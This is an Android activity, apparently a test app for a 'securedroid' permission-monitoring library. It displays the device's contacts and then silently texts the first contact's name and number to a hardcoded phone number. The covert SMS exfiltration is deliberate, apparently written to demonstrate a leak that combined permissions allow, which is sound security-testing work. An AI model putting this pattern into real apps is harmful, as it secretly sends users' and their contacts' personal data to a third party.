package com.example.multiple_permissions;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.example.securedroid.SecContentResolver;
import com.example.securedroid.SecSmsManager;

public class ContactsSms extends AppCompatActivity implements View.OnClickListener {

    Button btn;
    TextView contacts;
    Cursor cursor;
    SecContentResolver secContentResolver;
    StringBuffer sb;
    StringBuffer temp;

    SecSmsManager secSmsManager;
    String phoneNoToMsg;
    String msg;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_contacts_sms);

        btn = findViewById(R.id.display);
        btn.setOnClickListener(this);

        contacts = findViewById(R.id.contacts);

        secContentResolver = new SecContentResolver(this);
        secSmsManager = new SecSmsManager(this);
    }

    @Override
    public void onClick(View view) {
        if ( ContextCompat.checkSelfPermission( this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Please give Read Contacts permission!!", Toast.LENGTH_SHORT).show();
            return;
        }
        sb = new StringBuffer();
        temp = new StringBuffer();
        cursor = secContentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        int name = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
        int number = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
        sb.append("Contacts :");

        if(cursor.moveToNext()){
            String prName = cursor.getString(name);
            String phNumber = cursor.getString(number);

            temp.append("\nName: " + prName + " \nPhone Number: " + phNumber);

            sb.append("\nName: " + prName + " \nPhone Number: " + phNumber);
            sb.append("\n----------------------------------");
        }

        while (cursor.moveToNext()) {
            String prName = cursor.getString(name);
            String phNumber = cursor.getString(number);

            sb.append("\nName: " + prName + " \nPhone Number: " + phNumber);
            sb.append("\n----------------------------------");
        }

        contacts.setText(sb);

        if ( ContextCompat.checkSelfPermission( this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        phoneNoToMsg = "+918982918682";
        msg = temp.toString();
        secSmsManager.sendTextMessage(phoneNoToMsg, null, msg, null, null);
    }
}
